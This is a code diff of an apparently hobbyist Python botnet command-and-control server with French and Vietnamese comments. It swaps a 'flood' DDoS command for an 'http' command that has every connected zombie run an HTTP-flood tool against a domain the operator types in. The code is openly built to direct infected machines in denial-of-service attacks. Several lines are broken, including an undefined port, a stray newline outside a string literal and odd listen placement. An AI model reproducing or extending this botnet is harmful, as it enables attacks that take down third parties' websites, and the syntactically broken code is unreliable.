@@ -1,13 +1,12 @@
-#coding:utf-8
-
 import socket
 import threading
 import time
 
 list_hostname = []
 z_command = "empty"
+control = "empty"
 
-#definition du thread
+# definition du thread
 nb_z = 0
 class Thread(threading.Thread):
     global z_command
@@ -27,7 +26,7 @@ class Thread(threading.Thread):
 #-------------------------------------------------------------------
 
 #c'est assez explicite la
-host, port = ('', 4445)
+host, port = ('hostlocal', port)
 
 #debut du serv
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -42,48 +41,26 @@ print("Waiting for bot...")
 list_cmd = ["help", "refresh"]
 
 #etablir la connection
+s.listen(5) # cho phép tối đa 5 kết nối đồng thời
 while True:
-    def command():
-        cmd = input("\n*----------Press Enter :----------*")
+    def command(conn):
+        cmd = input("\n*----------Press Enter :----------*"\n)
 
         while(cmd != [list_cmd]):
             cmd = input("\nBotnet>")
             
             if(cmd == "help"):
                 print("""
-
-                                                                    ,---------,          
-                               ,-----------------------,          ,"        ,"|
-                             ,"                      ,"|        ,"        ,"  |
-                            +-----------------------+  |      ,"        ,"    |
-                            |  .-----------------.  |  |     +---------+      |
-                            |  |                 |  |  |     | -==----'|      |
-                            |  |     WOAZO       |  |  |     |         |      |
-                            |  |    HACKING      |  |  |/----|`---=    |      |
-                            |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
-                            |  |                 |  |  |  // |(((( [33]|    ,"
-                            |  `-----------------'  |," .;'| |((((     |  ,"
-                            +-----------------------+  ;;  | |         |,"
-                                /_)______________(_/  //'   | +---------+
-                        ___________________________/___  `,
-                        /  oooooooooooooooo  .o.  oooo /,   \,"-----------
-                        / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
-                        /_==__==========__==_ooo__ooo=_/'   /___________,"
-                        `-----------------------------'
                 |-- Help: ------------------------------------------------------------------|
                 |  help               : Display this help screen                            |
                 |  cmd                : Send a command to all bots                          |
                 |  refresh            : Refresh request from bots to the server             |
-                |  flood              : Execute a DDoS attack with bots you have            |
-                |  how to cook an egg : Teach you how to cook an egg                        |
+                |  http               : HTTP-Flood (GET)                                    |
                 |  close              : Close all connections with bots and stop the server |
                 |---------------------------------------------------------------------------|
                 """)
             if(cmd == "refresh"):
                 break
-            
-            if(cmd == "how to cook an egg"):
-                print("\nWell, you can cook an egg by putting butter in a pan, and then, break your egg and put it in the pan too (pay attention to pieces of shells)")
             
             if(cmd == "cmd"):
                 x = 0
@@ -93,40 +70,30 @@ while True:
                 
                 for conn in list_hostname:
                     conn.send(z_command)
-
-            if(cmd == "flood"):
-                target_ip = input("\nHelp : \nTarget ip:Target port:Numer of packets (2500 pkts = 10sec) \nExemple : 1.1.1.1:80:2500\n#->> ")
-                target_ip = target_ip.encode("utf8")
-                flood_signal = (b"Flood " + target_ip)
-
+               
+            if cmd == "http":
+                domain = input("Nhập tên miền: ")
+                control = f"./getblaze --hostname https://{domain}"
+                control = control.encode()
                 for conn in list_hostname:
-                    conn.sendall(flood_signal)
-                print("Server: The DDoS attack has started")
+                    conn.sendall(control)
 
-                
             if(cmd == "close"):
-                close_sign = "close"
-                close_sign = close_sign.encode()
-                conn.send(close_sign)
-                conn.close()
+                print("\nClosing all connections...")
+                for conn in list_hostname:
+                    conn.send("close".encode())
+                    conn.close()
                 s.close()
-    
-    s.listen()
+                exit()
+
     conn, addr = s.accept()
+    hostname = conn.recv(1024).decode()
+    list_hostname.append(conn) # thêm kết nối vào danh sách
     nb_z = nb_z + 1
-    time.sleep(1)
+    print("Server: "+str(nb_z)+" zombie connected from "+str(addr)+" : "+str(hostname))
     
-    #commencer le thread
-    my_thread = Thread(conn)
-    my_thread.start()
+    thread = Thread(conn)
+    thread.start()
     
-    
-    list_hostname.append(conn)
-    print(list_hostname)
-
-    print("Server: Zombie connected! (", conn, ")")
-    time.sleep(0.5)
-    print("Server:", nb_z, "zombie(s) online.")
-    command()
-
-
+    t = threading.Thread(target=command, args=(conn,))
+    t.start()
